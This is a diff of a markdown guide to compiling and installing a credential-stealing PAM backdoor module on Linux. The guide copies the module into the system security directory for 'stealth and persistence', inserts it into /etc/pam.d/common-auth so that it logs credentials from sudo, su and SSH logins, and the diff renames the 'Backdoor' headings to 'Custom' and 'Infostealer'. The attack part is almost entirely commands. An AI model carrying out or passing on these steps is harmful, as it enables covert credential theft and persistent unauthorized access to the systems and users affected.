@@ -36,13 +36,13 @@ You need to install libpam0g-dev because it provides the header files and librar
 sudo apt update  
 sudo apt install libpam0g-dev  
 ```  
-#### Step 2: Compile the Backdoor PAM Module  
+#### Step 2: Compile the Custom PAM Module  
 ```
 gcc -fPIC -fno-stack-protector -c pam_backdoor.c  
 ld -x --shared -o pam_backdoor.so pam_backdoor.o
 ```
-#### Step3: Deploy the Backdoor Module into PAM's Trusted Directory  
-Copy the backdoor module to /lib/x86_64-linux-gnu/security/ because it’s the default trusted location for PAM modules, ensuring it’s automatically loaded by all PAM-aware services and stays hidden among legitimate system files for better stealth and persistence.   
+#### Step3: Deploy the Compiled Module into PAM's Trusted Directory  
+Copy the Custom module to /lib/x86_64-linux-gnu/security/ because it’s the default trusted location for PAM modules, ensuring it’s automatically loaded by all PAM-aware services and stays hidden among legitimate system files for better stealth and persistence.   
 ```
 sudo cp pam_backdoor.so /lib/x86_64-linux-gnu/security/
 ```      
@@ -51,7 +51,7 @@ Modify the _common-auth_ file under _/etc/pam.d_ , which handles authentication,
 sed -i '1i auth required pam_backdoor.so' /etc/pam.d/common-auth
 ```   
 
-#### Step4: Test the Backdoor Module 
+#### Step4: Test the Infostealer Module 
 Perform any authentication action like `sudo`, `su`, `su -`, or SSH logins. The backdoor will capture and log all credentials during these authentications.
 ```
 sudo su
